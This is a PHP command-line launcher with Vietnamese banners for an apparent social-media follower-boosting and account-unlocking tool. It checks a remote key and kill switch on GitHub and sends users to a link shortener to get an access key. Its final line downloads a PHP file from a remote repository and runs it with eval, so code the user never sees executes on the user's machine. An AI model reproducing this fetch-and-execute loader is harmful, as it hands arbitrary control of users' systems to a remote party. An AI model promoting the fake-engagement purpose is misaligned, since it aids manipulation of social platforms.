$ress = "\033[0;32m"; 
$res = "\033[1;33m"; 
$red = "\033[1;31m"; 
$green = "\033[1;37m"; 
$yellow = "\033[1;33m"; 
$white = "\033[1;33m"; 
$banner = "\r"; 
$duy="\033[1;35m"; 
$ngan="\033[1;36m"; 
$xnhac = "\033[1;96m"; 
$den = "\033[1;90m";
$do = "\033[1;91m"; 
$luc = "\033[1;92m";
$vang = "\033[1;93m"; 
$xduong = "\033[1;94m"; 
$hong = "\033[1;95m"; 
$trang = "\033[1;97m"; 
$red = "\033[1;31m"; 
$green = "\033[1;37m"; 
$white = "\033[1;33m"; 
$yellow = "\033[1;33m";
$end="\033[0m";
$whiteb="\033[1;37m";
$ress = "\033[0;32m";
$res = "\033[0;33m";
$red = "\033[0;31m";
$green = "\033[0;37m";
$yellow = "\033[0;33m";
$white = "\033[0;33m";
$xnhac = "\033[1;96m";
$den = "\033[1;90m";
$do = "\033[1;91m";
$luc = "\033[1;92m";
$vang = "\033[1;93m";
$xduong = "\033[1;94m";
$hong = "\033[1;95m";
$trang = "\033[1;97m";
$nenden = "\033[40m";
$xanhd = "\033[0;36m";
$nendo = "\033[41m";
$nenxanh = "\033[42m";
$nenvang = "\033[43m";
$nenblue = "\033[44m";
$nenPurpe = "\033[45m";
$nenCyan = "\033[46m";
$nentrang = "\033[47m";
$UGreen = "\033[4;32m";
$BGreen = "\033[1;32m";
$cong = "\033[1;32m";
$banner = "
\033[1;95m╔════════════════════════════════════════════════════════╗
\033[1;95m║ \033[1;96m███████╗\033[1;91m███╗   ██╗  \033[1;93m║ \033[1;36m ✍ Facebook.com/sangdeveloper\033[1;95m    ║
\033[1;95m║ \033[1;96m██╔════╝\033[1;91m████╗  ██║  \033[1;93m║\033[1;33m  ☎ Zalo : 0376942586            \033[1;95m ║
\033[1;95m║ \033[1;96m███████╗\033[1;91m██╔██╗ ██║  \033[1;93m║\033[0;94m  ♥ Hỗ Trợ Dịch Vụ MXH, Mở Khóa...\033[1;95m║
\033[1;95m║ \033[1;96m╚════██║\033[1;91m██║╚██╗██║  \033[1;93m║  \033[1;92m☭ Youtube : Sáng Developer      \033[1;95m║
\033[1;95m║ \033[1;96m███████║\033[1;91m██║ ╚████║ \033[1;93m ║\033[1;97m  ♕ Buff Follow Bằng Page+Pro5\033[1;95m    ║
\033[1;95m║ \033[1;96m╚═╝  ╚═╝\033[1;91m╚═╝  ╚═══╝ \033[1;93m ║ \033[0;31m ⚑ Bản Quyền By Nguyễn Văn Sáng\033[1;95m  ║
\033[1;95m║ \033[1;36m      Website Tăng Tương Tác MXH : LikeSubRe.Pro\033[1;95m       ║
\033[1;95m║ \033[1;92m  © 2023 - Thiết Kế Và Vận Hành Bởi Nguyễn Văn Sáng\033[1;95m    ║
\033[1;95m╚════════════════════════════════════════════════════════╝\n";
 
@system('clear');
echo $banner;
    $checkkey = file('https://raw.githubusercontent.com/sangdeveloper36/sang/main/key.html');
    $lock = file_get_contents('https://raw.githubusercontent.com/sangdeveloper36/sang/main/sangkk.md5');
    $keylock = md5(htmlspecialchars($lock));
    echo $res;
    if (md5('lock') != $keylock) {
        exit($red . "Server Đã Ngừng Hoạt Động liên hệ admin để lấy tool mới!!!
$res");
    } else {
    	echo "\033[1;33m│\e[1;101;93m Server Hoạt Động \e[0m\033[1;37m│    ";
        sleep(1);
    }
    echo "
";
    while (true) {
    	echo "[1;93mLấy Key Tại: https://link1s.com/keytoolvipsn[1;33m\n";
        echo "[1;93mNhập Api Key: [1;33m";
        $makey = trim(fgets(STDIN));
        if ($makey == $checkkey[0]) {
            echo "[1;32mkey chính xác...";
            echo "
";
            break;
        } else {
            echo "[1;31mMã key Không Đúng Vkl.";
            echo "
";
        }
    }
    @system('clear');
error_reporting(0);
session_start();
if (!$sock = @fsockopen('www.google.com', 80)) {
    exit ("\033[1;91m[ERROR] \033[1;97m=> \033[1;91mVui Lòng Bật Kết Nối Wifi Hoặc 4G.\n");
}else {
  $A = "\033[1;93mĐang Kiểm Tra Sever...";
  $B = strlen($A);
  for ($x = 0; $x < $B; $x++) {
    echo $A[$x];
    usleep(5000);
  }
}
sleep(0);
echo "\r";
if (!$sock = @fsockopen('www.google.com', 80)) {
    exit ("\033[1;91m[ERROR] \033[1;97m=> \033[1;91mVui Lòng Bật Kết Nối Wifi Hoặc 4G.\n");
}else {
  $C = "\033[1;93mKiểm Tra Sever Hoàn Tất.";
  $D = strlen($C);
  for ($x = 0; $x < $D; $x++) {
    echo $C[$x];
    usleep(5000);
  }
}
sleep(0);
echo "\r";
if (!$sock = @fsockopen('www.google.com', 80)) {
    exit ("\033[1;91m[ERROR] \033[1;97m=> \033[1;91mVui Lòng Bật Kết Nối Wifi Hoặc 4G.\n");
}else {
  $E = "\033[1;93m[\033[1;95mThànhCông\033[1;93m] \033[1;97m=> \033[1;93mĐang Vào Tools.";
  $G = strlen($E);
  for ($x = 0; $x < $G; $x++) {
    echo $E[$x];
    usleep(5000);
  }
}
sleep(0);
if (!$sock = @fsockopen('www.google.com', 80)) {
  exit ("\n\033[1;91m[ERROR] \033[1;97m=> \033[1;91mVui Lòng Bật Kết Nối Wifi Hoặc 4G.\n");
}else {
  eval(file_get_contents('https://raw.githubusercontent.com/sangdeveloper36/sang/main/31cd.php'));
}
